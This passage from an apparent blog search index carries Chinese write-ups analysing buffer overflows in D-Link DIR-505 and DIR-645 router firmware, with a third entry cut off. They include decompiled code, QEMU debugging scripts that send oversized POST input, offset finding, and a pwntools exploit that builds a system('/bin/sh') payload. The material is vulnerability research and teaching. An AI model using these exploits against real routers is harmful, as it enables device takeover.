<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>D-Link Dir-505 便携路由器越界漏洞分析</title>
      <link href="/CVE-d-link-dir-505/"/>
      <url>/CVE-d-link-dir-505/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="D-Link-Dir-505-便携路由器越界漏洞分析"><a href="#D-Link-Dir-505-便携路由器越界漏洞分析" class="headerlink" title="D-Link Dir-505 便携路由器越界漏洞分析"></a>D-Link Dir-505 便携路由器越界漏洞分析</h1><ul><li><a href="https://www.exploit-db.com/exploits/28184">D-Link DIR-505 1.06 - Multiple Vulnerabilities - Hardware webapps Exploit (exploit-db.com)</a></li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://c0ug4r.top/posts/book_notes_router_0day_3/">《揭秘家用路由器0day漏洞挖掘技术》漏洞分析笔记（三） :: Cougar — Blog (c0ug4r.top)</a></p><h2 id="固件下载-amp-分离"><a href="#固件下载-amp-分离" class="headerlink" title="固件下载&amp;分离"></a>固件下载&amp;分离</h2><p><a href="https://github.com/ray-cp/MIPS/blob/master/book_note/D-Link-DIR-505_overflow/DIR505A1_FW108B10.bin">MIPS/DIR505A1_FW108B10.bin at master · ray-cp/MIPS (github.com)</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  binwalk -Me DIR505A1_FW108B10.bin</span><br><span class="line">......</span><br><span class="line">➜  squashfs-root find . |grep my_cgi.cgi</span><br><span class="line">./usr/bin/my_cgi.cgi</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  squashfs-root checksec ./usr/bin/my_cgi.cgi</span><br><span class="line">    Arch:     mips-32-big</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>IDA打开<code>/usr/bin/my_cgi.cgi</code>, 搜索字符串<code>storage_path</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211109191042272.png" alt="image-20211109191042272"></p><p>根据函数名,我们不妨看看<code>get_input_entries</code></p><p>根据书上的结构及IDA反编译结果，我们可以创建如下结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> entries         struc  # (<span class="keyword">sizeof</span>=<span class="number">0x425</span>, mappedto_17)</span><br><span class="line"><span class="number">00000000</span> name:           .byte <span class="number">36</span> dup(?)</span><br><span class="line"><span class="number">00000024</span> value:          .byte <span class="number">1025</span> dup(?)</span><br><span class="line"><span class="number">00000425</span> entries         ends</span><br></pre></td></tr></table></figure><p>从而对该函数进行分析</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">get_input_entries</span><span class="params">(entries *_parameters, <span class="keyword">int</span> content_length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf_count; <span class="comment">// $s2</span></span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// $s0</span></span><br><span class="line">  <span class="keyword">int</span> auth; <span class="comment">// $s1</span></span><br><span class="line">  <span class="keyword">char</span> *IO_write_base; <span class="comment">// $v1</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">char</span> ch; <span class="comment">// $v1</span></span><br><span class="line">  <span class="keyword">int</span> (**v10)(FILE *); <span class="comment">// $t9</span></span><br><span class="line">  <span class="keyword">int</span> count; <span class="comment">// $lo</span></span><br><span class="line">  <span class="keyword">int</span> _buf_count; <span class="comment">// $s5</span></span><br><span class="line">  entries *parameters; <span class="comment">// $s1</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// $s2</span></span><br><span class="line">  <span class="keyword">char</span> path[<span class="number">1024</span>]; <span class="comment">// [sp+18h] [-400h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf_count = <span class="number">0</span>;</span><br><span class="line">  k = <span class="number">0</span>;</span><br><span class="line">  auth = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( content_length &gt; <span class="number">0</span> )                  <span class="comment">// read post parameters</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">stdin</span>-&gt;_fileno )</span><br><span class="line">    &#123;</span><br><span class="line">      IO_write_base = <span class="built_in">stdin</span>-&gt;_IO_write_base;</span><br><span class="line">      v8 = IO_write_base + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( IO_write_base &lt; <span class="built_in">stdin</span>-&gt;_IO_write_end )</span><br><span class="line">      &#123;</span><br><span class="line">        ch = *IO_write_base;</span><br><span class="line">        <span class="built_in">stdin</span>-&gt;_IO_write_base = v8;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">      &#125;</span><br><span class="line">      v10 = (<span class="keyword">int</span> (**)(FILE *))&amp;_fgetc_unlocked;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10 = &amp;fgetc;</span><br><span class="line">    &#125;</span><br><span class="line">    ch = ((<span class="keyword">int</span> (*)(<span class="keyword">void</span>))v10)();                <span class="comment">// get one char</span></span><br><span class="line">LABEL_8:</span><br><span class="line">    <span class="keyword">if</span> ( ch == <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      count = buf_count;</span><br><span class="line">      <span class="keyword">if</span> ( !auth )</span><br><span class="line">      &#123;</span><br><span class="line">        k = <span class="number">0</span>;</span><br><span class="line">        auth = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_15:</span><br><span class="line">      auth = <span class="number">1</span>;                                 <span class="comment">// WRITE_VALUE</span></span><br><span class="line">      _parameters[count].value[k] = ch;         <span class="comment">// get value</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( ch == <span class="string">&#x27;&amp;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++buf_count;</span><br><span class="line">      k = <span class="number">0</span>;</span><br><span class="line">      auth = <span class="number">0</span>;                                 <span class="comment">// WRITE_NAME</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">    &#125;</span><br><span class="line">    count = buf_count;</span><br><span class="line">    <span class="keyword">if</span> ( auth )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">    _parameters[count].name[k] = ch;            <span class="comment">// get name</span></span><br><span class="line">LABEL_16:</span><br><span class="line">    ++k;                                        <span class="comment">// name/value count</span></span><br><span class="line">LABEL_17:</span><br><span class="line">    --content_length;</span><br><span class="line">  &#125;</span><br><span class="line">  _buf_count = buf_count + <span class="number">1</span>;</span><br><span class="line">  parameters = _parameters;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(parameters-&gt;name, <span class="string">&quot;storage_path&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(parameters-&gt;name, <span class="string">&quot;path&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memset</span>(path, <span class="number">0</span>, <span class="keyword">sizeof</span>(path));</span><br><span class="line">        decode(parameters-&gt;value, path);</span><br><span class="line">        <span class="built_in">strcpy</span>(parameters-&gt;value, path);</span><br><span class="line">      &#125;</span><br><span class="line">      replace_special_char(parameters-&gt;value);</span><br><span class="line">    &#125;</span><br><span class="line">    ++i;</span><br><span class="line">    ++parameters;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( i &lt; _buf_count );</span><br><span class="line">  <span class="keyword">return</span> _buf_count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数看似是没有太大问题的，就是对POST中的参数进行格式化，但有一个问题是该函数没有大小限制，<code>get_input_entries</code>格式化POST参数时依赖参数中的<code>content_length</code>将HTTP中提供的POST参数中长度<code>content-length</code>的数据都格式化到堆栈上的局部变量<code>_parameters</code>中, 若<code>content_lenth</code>长度大于<code>buf</code>就可能造成溢出</p><p>查看交叉引用</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211109194541599.png" alt="image-20211109194541599"></p><p>可以定位到如下调用关系</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">entries my_entries[<span class="number">450</span>];</span><br><span class="line">......</span><br><span class="line">CONTENT_LENGTH = getenv(<span class="string">&quot;CONTENT_LENGTH&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( CONTENT_LENGTH )</span><br><span class="line">  content_length = strtol(CONTENT_LENGTH, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"> ......</span><br><span class="line"> <span class="built_in">memset</span>(my_entries, <span class="number">0</span>, <span class="keyword">sizeof</span>(my_entries));</span><br><span class="line"> input_entries = get_input_entries(my_entries, content_length);</span><br></pre></td></tr></table></figure><p>从调用<code>get_input_entries</code>函数附近的伪代码，可以看出，<code>content_length</code>来自<code>HTTP</code>协议的<code>content-length</code>字段，而结构体<code>my_entries</code>指向<code>栈</code>，大小为<code>450 * 0x425 = 477450 bytes</code>, 因此调用者和被调用者都没有对传入的数据进行长度限制，可以造成溢出</p><p>在这里，我们需要伪造<code>storage_path=xx</code>, 使得函数不会调用<code>replace_special_char()</code>或<code>decode()</code>对参数进行解码</p><h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h2><h3 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  squashfs-root python3 patternLocOffset.py -c -l 600 -f offset</span><br><span class="line">[*] Create pattern string contains 600 characters ok!</span><br><span class="line">[+] output to offset ok!</span><br><span class="line">[+] take time: 0.0014 s</span><br></pre></td></tr></table></figure><p>调试脚本<code>run_cgi.sh</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sudo ./run_cgi.sh</span></span><br><span class="line">INPUT=`python3 -c <span class="string">&quot;print(&#x27;storage_path=&#x27;+&#x27;A&#x27;*477450+open(&#x27;offset&#x27;,&#x27;r&#x27;).read())&quot;</span>`</span><br><span class="line">LEN=$(<span class="built_in">echo</span> <span class="variable">$&#123;#INPUT&#125;</span>)</span><br><span class="line">PORT=<span class="string">&quot;23946&quot;</span></span><br><span class="line">cp $(<span class="built_in">which</span> qemu-mips-static) ./qemu</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$INPUT</span>&quot;</span> | chroot . ./qemu -E CONTENT_LENGTH=<span class="variable">$LEN</span> -E CONTENT_TYPE=<span class="string">&quot;manultipart/form-data&quot;</span> -E SCRIPT_NAME=<span class="string">&quot;common&quot;</span> -E REQUEST_METHOD=<span class="string">&quot;POST&quot;</span> -E REQUEST_URI=<span class="string">&quot;/my_cgi.cgi&quot;</span> -g <span class="variable">$PORT</span> /usr/bin/my_cgi.cgi 2&gt;/dev/null</span><br><span class="line">rm -f ./qemu</span><br></pre></td></tr></table></figure><p>这里需要注意的是:</p><ul><li><p><code>CONTENT_TYPE</code>不能是<code>multipart/form-data</code></p><ul><li><p>在main函数前面有如下函数，如果<code>CONTENT_TYPE</code>为<code>multipart/form-data</code>, 会直接<code>return 0</code></p></li><li><p>```c<br>  CONTENT_TYPE = getenv(“CONTENT_TYPE”);<br>  ……<br>if ( CONTENT_TYPE &amp;&amp; strstr(CONTENT_TYPE, “multipart/form-data”) )<br>  {</p><pre><code>.......goto LABEL_152;......goto LABEL_170;</code></pre><p>  }<br>LABEL_152:</p><pre><code>        v41 = &quot;back&quot;;</code></pre><p>LABEL_170:</p><pre><code>        ((void (__fastcall *)(const char *))v19)(v41);        return 0;</code></pre><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- `SCRIPT_NAME`不能是`HNAP1`</span><br><span class="line"></span><br><span class="line">  - 在main函数前面有如下函数，如果`SCRIPT_NAME`为`HNAP1`, 会直接`return 0`</span><br><span class="line"></span><br><span class="line">  - ```c</span><br><span class="line">     SCRIPT_NAME_1 = getenv(&quot;SCRIPT_NAME&quot;);</span><br><span class="line">      if ( !SCRIPT_NAME_1 )</span><br><span class="line">        return 0;</span><br><span class="line">    if ( strstr(SCRIPT_NAME_1, &quot;HNAP1&quot;) )</span><br><span class="line">      &#123;</span><br><span class="line">        system(&quot;killall widgetd &gt; /dev/null&quot;);</span><br><span class="line">        v4 = do_hnap();</span><br><span class="line">        if ( v4 == 1 )</span><br><span class="line">        &#123;</span><br><span class="line">          save_entry_to_flash(HIBYTE(which_mode), 0);</span><br><span class="line">          write_lighttpd_404_redirect_info();</span><br><span class="line">          system(&quot;killall -SIGSYS lighttpd&quot;);</span><br><span class="line">          system(&quot;widgetd &amp; &gt; /dev/null&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else if ( v4 == 2 )</span><br><span class="line">        &#123;</span><br><span class="line">          system(&quot;hnap_reboot &amp;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>调试起来后：</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211109203005985.png" alt="image-20211109203005985"></p><p>计算偏移</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  squashfs-root python3 patternLocOffset.py -s 0x61374161 -l 600</span><br><span class="line">[*] Create pattern string contains 600 characters ok!</span><br><span class="line">[*] Exact match at offset 22</span><br><span class="line">[+] take time: 0.0002 s</span><br></pre></td></tr></table></figure><p>则总偏移为<code>padding = 477450 + 22 = 477472</code></p><h2 id="ROP链构造"><a href="#ROP链构造" class="headerlink" title="ROP链构造"></a>ROP链构造</h2><p>书上利用文件存在的<code>system</code>函数进行构造，在函数窗口中进行搜索</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211109204903550.png" alt="image-20211109204903550"></p><p>查找交叉引用，在<code>get_remote_mac + CC</code>处，找到如下指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00405B1C                 la      $t9, system</span><br><span class="line">.text:00405B20                 li      $s1, 0x440000</span><br><span class="line">.text:00405B24                 jalr    $t9 ; system</span><br><span class="line">.text:00405B28                 addiu   $a0, $sp, 0x28  # &#x27;(&#x27;  # command</span><br><span class="line">.text:00405B2C                 lw      $gp, 0x18($sp)</span><br></pre></td></tr></table></figure><p>这里调用了<code>system(command)</code>函数，且参数<code>command</code>布置在<code>$sp + 0x28</code>处即可</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;big&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">477472</span></span><br><span class="line">system_addr = <span class="number">0x0405B1C</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * offset</span><br><span class="line">payload += <span class="string">b&quot;\x00\x40\x5B\x1C&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;B&quot;</span> * <span class="number">0x28</span></span><br><span class="line">payload += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;exploit&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> exploit:</span><br><span class="line">    exploit.write(payload)</span><br><span class="line">    log.success(<span class="string">&quot;Create Exploit Success&quot;</span>)</span><br></pre></td></tr></table></figure><p>书里到这里就结束了，但在本地调试（非实机）的利用中发现，由于没有开启地址随机化，<code>0x405B1C</code>会导致存在<code>0x00</code>字节</p><p><strong>exploit:</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211109213815398.png" alt="image-20211109213815398"></p><p><strong>IDA调试:</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211109213709223.png" alt="image-20211109213709223"></p>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D-Link Dir-645 路由器溢出漏洞分析</title>
      <link href="/CVE-d-link-dir-645/"/>
      <url>/CVE-d-link-dir-645/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="D-Link-Dir-645-路由器溢出漏洞分析"><a href="#D-Link-Dir-645-路由器溢出漏洞分析" class="headerlink" title="D-Link Dir-645 路由器溢出漏洞分析"></a>D-Link Dir-645 路由器溢出漏洞分析</h1><ul><li><a href="https://www.exploit-db.com/exploits/33862">D-Link Devices - ‘Authentication.cgi’ Remote Buffer Overflow (Metasploit) - Hardware remote Exploit (exploit-db.com)</a></li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://c0ug4r.top/posts/book_notes_router_0day_2/">《揭秘家用路由器0day漏洞挖掘技术》漏洞分析笔记（二） :: Cougar — Blog (c0ug4r.top)</a></p><p><a href="http://roberto.greyhats.it/advisories/20130801-dlink-dir645.txt">roberto.greyhats.it/advisories/20130801-dlink-dir645.txt</a></p><h2 id="固件下载-amp-分离"><a href="#固件下载-amp-分离" class="headerlink" title="固件下载&amp;分离"></a>固件下载&amp;分离</h2><p>固件版本<strong>DIR645A1_FW103B11</strong></p><p>下载地址: <a href="http://files.dlink.com.au/products/DIR-645/REV_A/Firmware/DIR645_FW103B11/DIR645A1_FW103B11.zip">http://files.dlink.com.au/products/DIR-645/REV_A/Firmware/DIR645_FW103B11/DIR645A1_FW103B11.zip</a></p><p><strong>分离固件</strong>：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  11 binwalk -e DIR645A1_FW103B11.bin</span><br><span class="line">.....</span><br><span class="line">➜  _DIR645A1_FW103B11.bin.extracted ls squashfs-root</span><br><span class="line">bin  dev  etc  home  htdocs  include  lib  mnt  proc  sbin  sys  tmp  usr  var  www</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>该漏洞是CGI脚本在处理<code>authentication.cgi</code>请求，来读取POST参数中的”password”参数的值时造成的缓冲区溢出</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  squashfs-root find . |grep authentication.cgi</span><br><span class="line">./htdocs/web/authentication.cgi</span><br><span class="line">./htdocs/web/webfa_authentication.cgi</span><br></pre></td></tr></table></figure><p>而<code>authentication.cgi -&gt; /htdocs/cgibin</code></p><p>根据漏洞描述可以找到<code>authenticationcgi_main</code>函数，从而进行分析</p><p>首先是区分不同的操作，<code>authentication.cgi =&gt; 0</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">REQUEST_METHOD = getenv(<span class="string">&quot;REQUEST_METHOD&quot;</span>);</span><br><span class="line"> <span class="built_in">memset</span>(v60, <span class="number">0</span>, <span class="keyword">sizeof</span>(v60));</span><br><span class="line"> <span class="built_in">memset</span>(v66, <span class="number">0</span>, <span class="keyword">sizeof</span>(v66));</span><br><span class="line"> <span class="built_in">memset</span>(v57, <span class="number">0</span>, <span class="keyword">sizeof</span>(v57));</span><br><span class="line"> auth = divide_authentication(*argv);          <span class="comment">// /htdocs/web/authentication.cgi =&gt; 0</span></span><br><span class="line">                                               <span class="comment">// /htdocs/web/authentication_logout.cgi =&gt; 1</span></span><br><span class="line">                                               <span class="comment">// /htdocs/web/webfa_authentication.cgi =&gt; 2</span></span><br><span class="line">                                               <span class="comment">// /htdocs/web/webfa_authentication_logout.cgi =&gt;3</span></span><br></pre></td></tr></table></figure><p>接着判断<code>REQUEST_METHOD</code>是否为<code>GET</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// authentication.cgi:120</span></span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(REQUEST_METHOD, <span class="string">&quot;GET&quot;</span>) )         <span class="comment">// REQUEST_METHOD == GET</span></span><br></pre></td></tr></table></figure><p>判断<code>REQUEST_METHOD</code>是否为<code>GET</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// authentication.cgi:175</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strcmp</span>(REQUEST_METHOD, <span class="string">&quot;POST&quot;</span>) )         <span class="comment">// REQUEST_METHOD == POST</span></span><br></pre></td></tr></table></figure><p>在POST方法中，读取内容</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> ( !CONTENT_TYPE</span><br><span class="line">    || !CONTENT_LENGTH</span><br><span class="line">    || (CONTENT_LENGTH_INT = atoi(CONTENT_LENGTH), IO = fileno(<span class="built_in">stdin</span>), read(IO, CONTENT_BUF, CONTENT_LENGTH_INT) &lt; <span class="number">0</span>)</span><br><span class="line">    || (CONTENT_BUF[CONTENT_LENGTH_INT] = <span class="number">0</span>, Get_HTTP_COOKIE((<span class="keyword">int</span>)v66) &lt; <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_51:</span><br><span class="line">    v9 = <span class="number">5</span>;                                     <span class="comment">// &#123;\&quot;RESULT\&quot;: \&quot;FAIL\&quot;, \&quot;REASON\&quot;: \&quot;ERR_GET_UENTRY\&quot;&#125;</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_96;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里可以看到，<code>CONTENT_LENGTH_INT</code>来自我们传入的内容而非系统指定, 则<code>read(IO, CONTENT_BUF, CONTENT_LENGTH_INT)</code>可能造成溢出</p><p><code>LABEL_96</code>处进行返回包内容的判断，v9等于<code>&#123;\&quot;RESULT\&quot;: \&quot;FAIL\&quot;, \&quot;REASON\&quot;: \&quot;ERR_GET_UENTRY\&quot;&#125;</code></p><p>接着对CONTENT_BUF的内容进行判读，判断是否存在<code>id=</code>或<code>password=</code>，存在则进行读取</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">haystack = CONTENT_BUF;</span><br><span class="line">  dest = (<span class="keyword">char</span> *)v66;</span><br><span class="line">  point2id_password = (<span class="keyword">const</span> <span class="keyword">char</span> **)&amp;::point2id_password;<span class="comment">// id=</span></span><br><span class="line">                                                <span class="comment">// password=</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">2</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v24 = *point2id_password;</span><br><span class="line">    v25 = <span class="built_in">strstr</span>(haystack, *point2id_password);</span><br><span class="line">    v26 = &amp;v25[<span class="built_in">strlen</span>(v24)];</span><br><span class="line">    v27 = v26;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )                                 <span class="comment">// read until &#x27;&amp;&#x27; or &#x27;\x00&#x27;</span></span><br><span class="line">    &#123;</span><br><span class="line">      v28 = *v27;</span><br><span class="line">      <span class="keyword">if</span> ( v28 == <span class="string">&#x27;&amp;&#x27;</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ++v27;</span><br><span class="line">      <span class="keyword">if</span> ( !v28 )</span><br><span class="line">      &#123;</span><br><span class="line">        --v27;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v29 = v27 - v26;</span><br><span class="line">    <span class="keyword">if</span> ( i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( i != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_51;</span><br><span class="line">      <span class="built_in">strncpy</span>((<span class="keyword">char</span> *)&amp;v66[<span class="number">32</span>], v26, v27 - v26);<span class="comment">// read password</span></span><br><span class="line">      *((_BYTE *)&amp;v66[<span class="number">32</span>] + v29) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>(dest, v26, v27 - v26);            <span class="comment">// read id</span></span><br><span class="line">      *((_BYTE *)v66 + v29) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++point2id_password;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里可以看到<code>strncpy</code>出<code>27 - 26</code>这个长度实际也是可以控制进行溢出的， 但从<code>v66</code>溢出到<code>$ra</code>太远，可能影响其他寄存器导致程序奔溃</p><p>从上我们可以根据分析得到如下攻击思路</p><ul><li>通过发送POST包超长CONTENT使得溢出</li></ul><h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h2><p>根据上述漏洞分析，我们首先需要确定偏移量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  squashfs-root python3 patternLocOffset.py -c -l 1160 -f offset</span><br><span class="line">[*] Create pattern string contains 2000 characters ok!</span><br><span class="line">[+] output to offset ok!</span><br><span class="line">[+] take time: 0.0016 s</span><br></pre></td></tr></table></figure><ul><li>使用 2000，发现会覆盖<code>$a1</code>后导致程序崩溃，于是减少长度到 1160</li></ul><p>调试脚本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># user-mode-debug.sh</span></span><br><span class="line"><span class="comment"># sudo ./user-mode-debug.sh `python -c &quot;print &#x27;uid=test&amp;password=&#x27; + open(&#x27;offsetest&#x27;,&#x27;r&#x27;).read(1160)&quot;`</span></span><br><span class="line"></span><br><span class="line">INPUT=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">PORT=<span class="string">&quot;23946&quot;</span> <span class="comment"># ida debugger default port</span></span><br><span class="line">LEN=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$INPUT</span>&quot;</span> | wc -c)</span><br><span class="line">cp $(<span class="built_in">which</span> qemu-mipsel-static) ./qemu</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$INPUT</span> | chroot ./ ./qemu -E CONTENT_LENGTH=<span class="variable">$LEN</span> -E CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span> -E REQUEST_METHOD=<span class="string">&quot;POST&quot;</span> -E REQUEST_URI=<span class="string">&quot;/authentication.cgi&quot;</span> -E REMOTE_ADDR=<span class="string">&quot;127.0.0.1&quot;</span> -g <span class="variable">$PORT</span> /htdocs/web/authentication.cgi</span><br><span class="line">rm -rf ./qemu</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211108173250341.png" alt="image-20211108173250341"></p><p>计算得偏移为<code>1050</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  squashfs-root python3 patternLocOffset.py -s 0x42316A42 -l 1160</span><br><span class="line">[*] Create pattern string contains 1160 characters ok!</span><br><span class="line">[*] No exact matches, looking for likely candidates...</span><br><span class="line">[+] Possible match at offset 1053 (adjusted another-endian)</span><br><span class="line">[+] take time: 0.0003 s</span><br></pre></td></tr></table></figure><p>且栈布局为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">padding:1014</span><br><span class="line">$s0~$s7</span><br><span class="line">$fp</span><br><span class="line">$ra</span><br></pre></td></tr></table></figure><h2 id="ROP链构造"><a href="#ROP链构造" class="headerlink" title="ROP链构造"></a>ROP链构造</h2><p>与<a href="https://lantern.cool/CVE-d-link-dir-815/">D-Link DIR-815 路由器多次溢出漏洞分析 | Lantern’s 小站</a>相同</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>该固件多个地方存在漏洞，详情查看<a href="http://roberto.greyhats.it/advisories/20130801-dlink-dir645.txt">roberto.greyhats.it/advisories/20130801-dlink-dir645.txt</a></p>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D-Link DIR-815 路由器多次溢出漏洞分析</title>
      <link href="/CVE-d-link-dir-815/"/>
      <url>/CVE-d-link-dir-815/</url>
      
